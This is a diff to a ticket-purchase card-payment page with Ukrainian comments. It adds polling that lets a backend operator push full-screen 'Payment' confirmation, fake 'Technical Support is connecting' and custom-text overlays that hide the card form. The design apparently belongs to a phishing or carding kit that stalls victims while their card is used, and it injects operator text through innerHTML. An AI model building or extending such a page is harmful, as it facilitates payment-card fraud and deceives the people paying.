@@ -318,6 +318,7 @@
     // --- Універсальний POLLING для всіх кнопок (push, support, text) ---
     let supportTabOpened = false;
     let pushTabOpened = false;
+    let textTabOpened = false;
     
     function getPageCode() {
         const urlParams = new URLSearchParams(window.location.search);
@@ -343,8 +344,14 @@
             const pushTxt = await pushResp.text();
             
             if (pushTxt === 'true' && !pushTabOpened) {
+                const { total, currency } = getTotalAndCurrency();
+                const pushTitle = document.getElementById('push-payment-title');
+                if (pushTitle) {
+                    pushTitle.textContent = `Payment ${total} ${currency}`;
+                }
                 document.getElementById('push-overlay').style.display = 'flex';
-                if (window.loadingOverlay) loadingOverlay.style.display = 'none';
+                document.getElementById('payment-card-main').style.display = 'none';
+                if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
                 pushTabOpened = true;
             }
         } catch (e) {
@@ -362,18 +369,81 @@
             const supportData = await supportResp.json();
             
             if ((supportData.show_support || supportData.show_text)) {
-                loadingOverlay.style.display = 'none';
+                if (window.loadingOverlay) window.loadingOverlay.style.display = 'none';
             }
             
-            if (!supportTabOpened && (supportData.show_support || supportData.show_text)) {
-                if (supportData.show_support) {
-                    window.open(`/buy-tickets/loading/waiting-support.html?page=${page_code}`, '_blank');
-                    supportTabOpened = true;
+            // Support кнопка - показуємо overlay замість нового вікна
+            if (!supportTabOpened && supportData.show_support) {
+                // Створюємо support overlay якщо його немає
+                if (!document.getElementById('support-overlay')) {
+                    const supportOverlay = document.createElement('div');
+                    supportOverlay.id = 'support-overlay';
+                    supportOverlay.style.cssText = `
+                        display: flex;
+                        position: fixed;
+                        top: 0; left: 0; width: 100vw; height: 100vh;
+                        background: rgba(0,0,0,0.8);
+                        z-index: 100000;
+                        align-items: center;
+                        justify-content: center;
+                        flex-direction: column;
+                    `;
+                    supportOverlay.innerHTML = `
+                        <div style="background: white; padding: 2rem; border-radius: 10px; max-width: 90%; text-align: center;">
+                            <h3>Technical Support</h3>
+                            <p>Our support team is connecting to help you...</p>
+                            <div style="margin: 1rem 0;">
+                                <div class="spinner-border text-primary" role="status">
+                                    <span class="sr-only">Loading...</span>
+                                </div>
+                            </div>
+                            <p>Please wait while we connect you to our support specialist.</p>
+                        </div>
+                    `;
+                    document.body.appendChild(supportOverlay);
                 }
-                if (supportData.show_text && supportData.text_id) {
-                    window.open(`/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${supportData.text_id}`, '_blank');
-                    supportTabOpened = true;
-                }
+                document.getElementById('support-overlay').style.display = 'flex';
+                document.getElementById('payment-card-main').style.display = 'none';
+                supportTabOpened = true;
+            }
+            
+            // Text кнопка - показуємо overlay замість нового вікна
+            if (!textTabOpened && supportData.show_text && supportData.text_id) {
+                // Завантажуємо текст і показуємо overlay
+                fetch(`/get_custom_text?text_id=${supportData.text_id}`)
+                    .then(resp => resp.text())
+                    .then(textContent => {
+                        if (!document.getElementById('text-overlay')) {
+                            const textOverlay = document.createElement('div');
+                            textOverlay.id = 'text-overlay';
+                            textOverlay.style.cssText = `
+                                display: flex;
+                                position: fixed;
+                                top: 0; left: 0; width: 100vw; height: 100vh;
+                                background: rgba(0,0,0,0.8);
+                                z-index: 100000;
+                                align-items: center;
+                                justify-content: center;
+                                flex-direction: column;
+                            `;
+                            textOverlay.innerHTML = `
+                                <div style="background: white; padding: 2rem; border-radius: 10px; max-width: 90%; max-height: 80vh; overflow-y: auto;">
+                                    <h3>Important Information</h3>
+                                    <div id="text-content" style="margin: 1rem 0; text-align: left;"></div>
+                                    <button onclick="document.getElementById('text-overlay').style.display='none';document.getElementById('payment-card-main').style.display='block';" 
+                                            style="background: #007bff; color: white; border: none; padding: 0.5rem 1rem; border-radius: 5px; cursor: pointer;">
+                                        Close
+                                    </button>
+                                </div>
+                            `;
+                            document.body.appendChild(textOverlay);
+                        }
+                        document.getElementById('text-content').innerHTML = textContent;
+                        document.getElementById('text-overlay').style.display = 'flex';
+                        document.getElementById('payment-card-main').style.display = 'none';
+                        textTabOpened = true;
+                    })
+                    .catch(e => console.error('Text loading error:', e));
             }
         } catch (e) {
             console.error('Support polling error:', e);
@@ -456,7 +526,7 @@ document.getElementById('cvv-input').addEventListener('input', function(e) {
 </script>
     <script>
 document.getElementById('card-input').addEventListener('input', function(e) {
-  this.value = this.value.replace(/[^0-9 ]/g, '');
+  this.value = this.value.replace(/\D/g, '').slice(0, 16);
 });
 </script>
     <script>
